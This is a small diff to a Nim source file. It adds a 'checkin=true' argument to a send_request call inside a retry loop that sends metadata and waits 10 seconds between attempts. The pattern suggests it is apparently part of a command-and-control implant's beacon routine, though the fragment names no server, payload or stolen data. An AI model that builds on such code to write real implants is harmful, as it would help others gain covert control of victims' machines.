@@ -15,7 +15,7 @@ proc checkin(): bool =
     for i in 1 .. check_in_max_retries:
         dbg "[+] attempt check in " & $i
         try:
-            discard send_request(meta_data)
+            discard send_request(meta_data, checkin=true)
             return true
         except CatchableError:
             sleep(10*1000)
